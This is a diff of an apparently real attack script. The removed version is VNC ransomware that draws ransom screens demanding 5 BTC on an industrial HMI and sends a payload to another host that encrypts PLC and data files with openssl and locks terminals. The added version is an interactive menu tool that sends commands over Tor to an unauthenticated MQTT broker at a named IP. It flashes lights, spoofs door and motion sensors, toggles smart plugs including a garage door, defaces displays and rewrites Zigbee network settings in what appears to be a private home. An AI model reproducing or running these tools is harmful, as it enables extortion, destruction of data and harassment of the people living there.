@@ -1,129 +1,221 @@
 #!/bin/bash
-# TRUSTEDF57 VNC RANSOMWARE - FIXED NC INJECTION
-# 122.63.17.182:6590 - Working handshake + frames
 
-TARGET="194.170.156.42"
-PORT=5901
-WIDTH=800
-HEIGHT=480
+# Zigbee2MQTT Chaos Control v2.0 - TRUSTEDF57 DOMINA -PS FOLLOW MRBEAST!
+# TARGET: 38.85.149.43:1883 (Connection 0 - NO AUTH)
 
-echo "🔥 TRUSTEDF57 - FIXED NC INJECTION STARTING 🔥"
-
-# Create proper VNC raw pixel injector
-cat << 'EOF' > f57_vnc_inject.sh
-#!/bin/bash
-TARGET_IP="$1"
-VNC_PORT="$2"
-
-printf "Connecting to %s:%s...\n" "$TARGET_IP" "$VNC_PORT"
-
-# VNC 3.8 Handshake - CORRECT BYTES
-( echo -en "RFB 003.008\x0a"; sleep 0.2 ) | nc "$TARGET_IP" "$VNC_PORT"
-
-# Read security types (1 byte num_types)
-NUM_TYPES=$(echo -en "\x01" | nc "$TARGET_IP" "$VNC_PORT" 2>/dev/null | xxd -p | cut -d: -f2 | xargs printf "%d\n")
-
-echo "Security types: $NUM_TYPES (using NONE=1)"
-
-# Send NONE auth (0x01)
-echo -en "\x01" | nc "$TARGET_IP" "$VNC_PORT"
-
-# Auth result (4 bytes)
-sleep 0.2
-
-# ClientInit (shared=0)
-echo -en "\x00" | nc "$TARGET_IP" "$VNC_PORT"
-
-# ServerInit (24 bytes): width,height,pf,name_len=0
-SERVER_INIT="\x00\x00\x03\x20\x00\x00\x01\xe0\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-echo -en "$SERVER_INIT" | xxd -r -p | nc "$TARGET_IP" "$VNC_PORT"
-
-# Server name (0 bytes)
-echo -en "\x00\x00\x00\x00" | xxd -r -p | nc "$TARGET_IP" "$VNC_PORT"
-
-printf "✅ VNC Session established\n"
-
-# FRAMEBUFFER UPDATE REQUEST - FULL SCREEN RAW
-FB_REQ="\x03\x00\x00\x00\x07\xff\x00\x00\x03\x20\x01\xe0"
-echo -en "$FB_REQ" | xxd -r -p | nc "$TARGET_IP" "$VNC_PORT"
-
-# INFINITE RANSOMWARE LOOP
+MQTT_HOST="38.85.149.43"
+MQTT_PORT="1883"
 COUNTER=0
-while true; do
-    # Generate ransomware frame 800x480 RGB565 RAW
-    convert -size 800x480 xc:"\#1a0033" \\
-        -fill "#ff1493" -pointsize 60 -gravity center -annotate +0+50 "TRUSTEDF57" \\
-        -fill "#ffd700" -pointsize 35 -annotate +0+150 "MARTHA FUCKED" \\
-        -fill "#ff4500" -pointsize 30 -annotate +0+220 "HMI LOCKED" \\
-        -fill "#00ff88" -pointsize 28 -annotate +0+280 "5 BTC PAYMENT" \\
-        -fill "#ff0000" -pointsize 40 -gravity center -annotate +0+350 "BUTTONS" \\
-        -fill "#ffffff" -pointsize 40 -annotate +0+390 "DISABLED" \\
-        -draw "rectangle 20,20 780,460" \\
-        - | convert - -resize 800x480! -depth 16 \\
-        -type TrueColor \\
-        -compress none rgb:- | hexdump -v -e '/1 "%02x"' | xxd -r -p > frame.raw
+
+torsocks_mqtt() {
+    ((COUNTER++))
+    echo -e "\e[91m[$COUNTER]\e[0m \e[93mTORSOX → \e[92m$MQTT_HOST:$MQTT_PORT\e[0m \e[96m$1\e[0m"
+    torsocks mosquitto_pub -h $MQTT_HOST -p $MQTT_PORT \
+        -t "$1" -m "$2" -q 0 -r
+}
+
+deface_displays() {
+    echo -e "\e[91m[DEFACE-$COUNTER]\e[0m \e[95m📺 DISPLAY HACK - TRUSTEDF57 DOMINA!\e[0m"
     
-    # Matrix rain effect (overlay F57 chars)
-    for i in {1..40}; do
-        POS_X=$(( ($COUNTER * 7 + $i * 20) % 800 ))
-        POS_Y=$(( ($i * 13 + $COUNTER * 11) % 480 ))
-        convert frame.raw \\
-            -fill "#00ff88" -pointsize 20 -annotate +${POS_X}+${POS_Y} "F57" frame.raw
+    # Home Assistant Lovelace/Dashboard override
+    torsocks_mqtt "homeassistant/panel/override" '{"state":"hacked","message":"TRUSTEDF57 DOMINA -PS FOLLOW MRBEAST!"}'
+    
+    # Zigbee screens/displays (night lights, FP1 screens)
+    torsocks_mqtt "zigbee2mqtt-5/Zigbee Plus Network 2 Master Bath Master Bathroom Smart Night Light/set" '{"state":"ON","brightness":255,"color":{"x":0.3,"y":0.6},"effect":"F57"}'
+    
+    torsocks_mqtt "zigbee2mqtt/Zigbee Plus 1st Floor Hall 1st Floor Hallway Night Light/set" '{"state":"ON","brightness":255,"color":{"hue":0},"effect":"scroll"}'
+    
+    # Bridge config per screens
+    torsocks_mqtt "zigbee2mqtt/bridge/config" '{"permit_join":true,"led_invert":true,"screen_text":"TRUSTEDF57 DOMINA"}'
+    torsocks_mqtt "zigbee2mqtt-5/bridge/config" '{"permit_join":true,"led_invert":true,"screen_text":"PS FOLLOW MRBEAST!"}'
+    torsocks_mqtt "zigbee2mqtt-3/bridge/config" '{"permit_join":true,"led_invert":true,"screen_text":"F57 HACKED"}'
+    
+    # FP1 Motion screens (se supportano overlay)
+    torsocks_mqtt "zigbee2mqtt/Zigbee Plus Office Aqara FP1 Office Motion Sensor/set" '{"overlay":"TRUSTEDF57 DOMINA","brightness":100}'
+}
+
+blink_all_lights() {
+    echo -e "\e[91m[LAMPEGGIO-$COUNTER]\e[0m \e[93m💡 TUTTE LE LUCI BLINK LOOP!\e[0m"
+    
+    lights=(
+        "zigbee2mqtt/Zigbee Plus Living Room Living Room Dresser Lamp/set"
+        "zigbee2mqtt/Zigbee Plus Foyer Foyer Lamp Bulb/set"
+        "zigbee2mqtt-5/Zigbee Plus Network 2 2nd Floor Hall 2nd Floor Hallway Lamp/set"
+        "zigbee2mqtt/Zigbee Plus Kitchen Kitchen Sink Light Bulb/set"
+        "zigbee2mqtt/Zigbee Plus Dining Room Dining Room Lamp/set"
+        "zigbee2mqtt-5/Zigbee Plus Network 2 Master Bedroom L Night Stand Smart Plug/set"
+        "zigbee2mqtt/Zigbee Plus Foyer Foyer Lamp/set"
+        "zigbee2mqtt/Zigbee Plus Office Office Lamp/set"
+        "zigbee2mqtt/Zigbee Plus 2nd Floor Hall 2nd Floor Hall Lamp/set"
+        "zigbee2mqtt/Zigbee Plus Living Room Living Room Dresser Lamp Smart Plug/set"
+        "zigbee2mqtt/Zigbee Plus Foyer Foyer Lamp Smart Plug/set"
+        "zigbee2mqtt/Zigbee Plus Garage OH Door Garage Overhead Door Smart Plug/set"
+        "zigbee2mqtt/Zigbee Plus Master Bedroom Master Bedroom Desk Lamp S/P/set"
+        "zigbee2mqtt-5/Zigbee Plus Network 2 Master Bath Master Bathroom Smart Night Light/set"
+        "zigbee2mqtt/Zigbee Plus 1st Floor Hall 1st Floor Hallway Night Light/set"
+        "zigbee2mqtt/Zigbee Plus Kitchen Aqara Kitchen Sink Light Bulb/set"
+        "zigbee2mqtt/Zigbee Plus Dining Room Dining Room Lamp Smart Plug/set"
+        "zigbee2mqtt-5/Zigbee Plus Network 2 2nd Floor Hall 2nd Floor Hallway Nightlight Smart Plug/set"
+        "zigbee2mqtt/Zigbee Plus Stair Closet Stair Closet Light Bulb/set"
+        "zigbee2mqtt/Zigbee Plus Foyer Foyer Lamp Bulb/set"
+    )
+    
+    # Blink loop infinito
+    for i in {1..50}; do
+        for light in "${lights[@]}"; do
+            torsocks_mqtt "$light" '{"state":"ON","brightness":255,"transition":0.05}' &
+        done
+        sleep 0.3
+        for light in "${lights[@]}"; do
+            torsocks_mqtt "$light" '{"state":"OFF","brightness":0,"transition":0.05}' &
+        done
+        sleep 0.3
+    done &
+}
+
+open_close_all() {
+    echo -e "\e[91m[APRI-CHIUDI-$COUNTER]\e[0m \e[93m🚪 TUTTE PORTE/FINESTRE!\e[0m"
+    
+    doors=(
+        "zigbee2mqtt-5/Zigbee Plus J&J Bathroom Aqara J&J Bath Toilet and Shower Door"
+        "zigbee2mqtt-3/Zigbee Plus Garage Garage O/H Door Top Tilt Sensor"
+        "zigbee2mqtt-3/Zigbee Plus Garage Garage O/H Door Bottom Tilt Sensor"
+        "zigbee2mqtt/Zigbee Plus Front Entry Front Entry Door Sensor"
+        "zigbee2mqtt/Zigbee Plus 1/2 Bath Aqara 1/2 Bath Door Sensor"
+        "zigbee2mqtt/Zigbee Plus Stair Closet Aqara Stair Closet Door Switch"
+        "zigbee2mqtt-5/Zigbee Plus Network 2 J&J Bathroom J&J Bathroom Shower Door Sensor"
+        "zigbee2mqtt/Zigbee Plus Garage OH Door Garage O/H Door Top Tilt Sensor"
+        "zigbee2mqtt/Zigbee Plus Kitchen Aqara Kitchen Glass Door Sensor"
+    )
+    
+    for door in "${doors[@]}"; do
+        torsocks_mqtt "$door" '{"contact":false}' &  # APERTO
+        sleep 0.4
+        torsocks_mqtt "$door" '{"contact":true}' &   # CHIUSO
     done
+    wait
+}
+
+motion_chaos() {
+    echo -e "\e[91m[MOTION-$COUNTER]\e[0m \e[93m👁️ FP1/FP1E FLOOD!\e[0m"
     
-    # SEND FRAME HEADER + DATA
-    FRAME_HEADER="\x00" # Raw encoding
-    printf "\x00\x00\x00\x00\x01\x00\x00\x00\x00" | xxd -r -p | nc -w 2 "$TARGET_IP" "$VNC_PORT"
-    cat frame.raw | nc -w 3 "$TARGET_IP" "$VNC_PORT" >/dev/null 2>&1
+    fps=(
+        "zigbee2mqtt-5/Zigbee Plus Network 2 Kitchen Aqara FP1E Kitchen Motion Sensor"
+        "zigbee2mqtt/Zigbee Plus Office Aqara FP1 Office Motion Sensor"
+        "zigbee2mqtt-3/Aqara Laundry Room Motion Sensor [Aqara FP1]E"
+        "zigbee2mqtt/Zigbee Plus Garage Aqara FP1 Garage Motion Sensor"
+        "zigbee2mqtt/Zigbee Plus Dining Room Aqara FP1 Dining Room Motion Sensor"
+        "zigbee2mqtt-5/Zigbee Plus Network 2 1/2 Bath Aqara FP1 1/2 Bath Motion Sensor"
+        "zigbee2mqtt/Zigbee Plus Kitchen Aqara FP1 Kitchen Motion Sensor"
+    )
     
-    COUNTER=$((COUNTER + 1))
-    sleep 0.08  # 12 FPS smooth
+    for fp in "${fps[@]}"; do
+        torsocks_mqtt "$fp" '{"occupancy":true,"illuminance":99999,"battery":1}' &
+        torsocks_mqtt "$fp" '{"motion":true,"illuminance_lux":99999}' &
+    done
+    wait
+}
+
+button_spam() {
+    echo -e "\e[91m[BUTTONS-$COUNTER]\e[0m \e[93m🔘 PULSANTI SPAM!\e[0m"
     
-    printf "\r🎥 Frame %d sent - Ransom active" $COUNTER
-done
-EOF
+    buttons=(
+        "zigbee2mqtt/Aqara Button 1" "zigbee2mqtt/Red Button"
+        "zigbee2mqtt/Blue Button" "zigbee2mqtt-5/Blue Button"
+    )
+    
+    for i in {1..20}; do
+        for btn in "${buttons[@]}"; do
+            torsocks_mqtt "$btn" '{"action":"single","click":"single"}' &
+            torsocks_mqtt "$btn" '{"action":"double"}' &
+            torsocks_mqtt "$btn" '{"action":"triple"}' &
+            torsocks_mqtt "$btn" '{"action":"long_press"}' &
+        done
+        sleep 0.1
+    done &
+}
 
-chmod +x f57_vnc_inject.sh
+plugs_cycle() {
+    echo -e "\e[91m[PRESE-$COUNTER]\e[0m \e[93m🔌 SMART PLUGS CYCLE!\e[0m"
+    
+    plugs=(
+        "zigbee2mqtt-3/Zigbee Plus Network 3 Laundry Room Aqara Smart Plug [Washer]/set"
+        "zigbee2mqtt-5/Zigbee Plus Network 2 Master Bedroom L Night Stand Smart Plug Master Bedroom L Night Stand Lamp/set"
+        "zigbee2mqtt/Zigbee Plus Office Desk Fan Smart Plug/set"
+        "zigbee2mqtt/Zigbee Plus Garage Work Bench Garage Work Bench Smart Plug/set"
+        "zigbee2mqtt/Zigbee Plus Garage OH Door Garage O/H Door Smart Plug/set"
+    )
+    
+    for plug in "${plugs[@]}"; do
+        torsocks_mqtt "$plug" '{"state":"ON","brightness":255}' &
+        sleep 0.5
+        torsocks_mqtt "$plug" '{"state":"OFF"}' &
+    done
+    wait
+}
 
-# PLC ENCRYPTION (shell injection)
-cat << 'EOF' > f57_encrypt.sh
-#!/bin/bash
-echo "💾 Injecting PLC encryption..."
-(
-echo -en "\x08\x00\x00\x00" # ClientCutText
-echo -en "\x00\x00\x00\xFF"
-echo -en "rm /tmp/f57_key 2>/dev/null; openssl rand -hex 32 > /tmp/f57_key; "
-echo -en "for f in \$(find /data /hmi /plc /var -type f -size -10M 2>/dev/null); do openssl enc -aes-256-cbc -in \$f -out \${f}.F57 -pass pass:f57ransomkey123; done; "
-echo -en "chmod 000 /dev/tty* 2>/dev/null; echo 'F57 RANSOM' > /tmp/.locked"
-) | nc 122.63.17.182 6590
-EOF
+bridge_overload() {
+    echo -e "\e[91m[BRIDGE-$COUNTER]\e[0m \e[93m🌉 BRIDGE OVERLOAD!\e[0m"
+    torsocks_mqtt "zigbee2mqtt/bridge/config" '{"permit_join":true,"led_invert":true,"pan_id":0xF57F}'
+    torsocks_mqtt "zigbee2mqtt-3/bridge/config" '{"permit_join":true,"channel":25,"led_invert":true}'
+    torsocks_mqtt "zigbee2mqtt-5/bridge/config" '{"permit_join":true,"network_key":"F57DOMINA","led_invert":true}'
+    torsocks_mqtt "zigbee2mqtt/bridge/devices" '{"deface":"TRUSTEDF57"}'
+}
 
-chmod +x f57_encrypt.sh
+show_menu() {
+    clear
+    echo -e "\e[91m╔══════════════════════════════════════════════════════╗"
+    echo -e "║ \e[95m🎯 38.85.149.43:1883 \e[96m[\e[92m$COUNTER\e[96m]\e[0m \e[95mTRUSTEDF57 DOMINA!\e[0m ║"
+    echo -e "╠══════════════════════════════════════════════════════╣"
+    echo -e "║ \e[93mPS FOLLOW MRBEAST! - Zigbee2MQTT CHAOS v2.0\e[0m                 ║"
+    echo -e "╠══════════════════════════════════════════════════════╣"
+    echo -e "║ \e[92m1.\e[0m 💡 Lampeggio TUTTE luci (loop 50x)                    ║"
+    echo -e "║ \e[92m2.\e[0m 🚪 Apri/Chiudi TUTTE porte (loop)                    ║"
+    echo -e "║ \e[92m3.\e[0m 👁️  Motion FP1/FP1E FLOOD                           ║"
+    echo -e "║ \e[92m4.\e[0m 🔘   Button spam infinito                            ║"
+    echo -e "║ \e[92m5.\e[0m 🔌  Smart plugs ON/OFF cycle                          ║"
+    echo -e "║ \e[92m6.\e[0m 📺  DEFACE displays + screens                         ║"
+    echo -e "║ \e[92m7.\e[0m 🌉  Bridge config overload                            ║"
+    echo -e "║ \e[92m8.\e[0m \e[91m💥 CHAOS TOTALE LOOP INFINITO\e[0m                      ║"
+    echo -e "║ \e[92m0.\e[0m Reset counter                                        ║"
+    echo -e "║ \e[92mQ.\e[0m Esci                                               ║"
+    echo -e "╚══════════════════════════════════════════════════════╝\e[0m"
+}
 
-# LAUNCH
-echo "Dependencies..."
-command -v convert >/dev/null || { echo "Install imagemagick: sudo apt install imagemagick"; exit 1; }
-command -v nc >/dev/null || { echo "Install netcat"; exit 1; }
+chaos_total() {
+    echo -e "\e[91m💥 CHAOS TOTALE AVVIATO su 38.85.149.43!\e[0m"
+    echo -e "\e[93mCtrl+C per fermare il massacro...\e[0m"
+    
+    while true; do
+        deface_displays
+        blink_all_lights &
+        open_close_all
+        motion_chaos
+        button_spam &
+        plugs_cycle
+        bridge_overload
+        echo -e "\e[91m🔥 Cycle #$COUNTER completato - F57 DOMINA!\e[0m"
+        sleep 3
+    done
+}
 
-# START RANSOMWARE VISUAL
-./f57_vnc_inject.sh $TARGET $PORT &
-
-# ENCRYPT DATA
-./f57_encrypt.sh &
-
-# PERSISTENCE FLOOD
-(
 while true; do
-    printf "\x03\x00\x00\x00\x07\xff\x00\x00\x03\x20\x01\xe0" | xxd -r -p | nc -w 1 $TARGET $PORT 2>/dev/null
-    sleep 2
+    show_menu
+    read -p "🎯 Scelta: " choice
+    
+    case $choice in
+        1) blink_all_lights ;;
+        2) open_close_all ;;
+        3) motion_chaos ;;
+        4) button_spam ;;
+        5) plugs_cycle ;;
+        6) deface_displays ;;
+        7) bridge_overload ;;
+        8) chaos_total ;;
+        0) COUNTER=0; echo -e "\e[92mCounter resettato!\e[0m" ;;
+        q|Q) echo -e "\e[95mF57 DOMINA 38.85.149.43 - MISSIONE COMPLETATA!\e[0m"; exit 0 ;;
+        *) echo -e "\e[91mOpzione sbagliata!\e[0m" ;;
+    esac
+    
+    read -p $'\e[93mPremi INVIO per menu...\e[0m'
 done
-) &
-
-echo ""
-echo "✅ RANSOMWARE DEPLOYED SUCCESSFULLY!"
-echo "🎥 HMI mostra: TRUSTEDF57 + MARTHA FUCKED + BUTTONS DISABLED"
-echo "🔒 Controlli bloccati + matrix rain F57"
-echo "💾 Files PLC encryptati AES-256"
-echo "⏱️ 12 FPS loop infinito"
-echo ""
-echo "FERMA CON: pkill -f f57_vnc_inject"
